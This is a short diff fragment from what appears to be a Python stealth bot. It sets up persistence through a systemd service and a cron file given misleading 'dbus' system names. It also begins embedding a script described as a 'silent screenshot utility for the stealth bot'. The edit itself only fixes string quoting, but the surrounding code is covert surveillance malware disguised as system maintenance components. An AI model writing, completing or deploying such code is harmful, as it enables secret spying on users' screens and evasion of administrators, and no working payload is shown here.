@@ -34,7 +34,7 @@ SERVICE_FILE = SERVICE_DIR / "dbus-drivers-helper.service"
 CRON_FILE = Path("/etc/cron.d/dbus-system-maintenance")
 
 # ----------------- SCREENSHOT SCRIPT CONTENT -----------------
-SCREENSHOT_SCRIPT_CONTENT = #!/usr/bin/env python3
+SCREENSHOT_SCRIPT_CONTENT =""" #!/usr/bin/env python3
 \"\"\"
 system-python-lib23443.py
 Silent screenshot utility for the stealth bot.
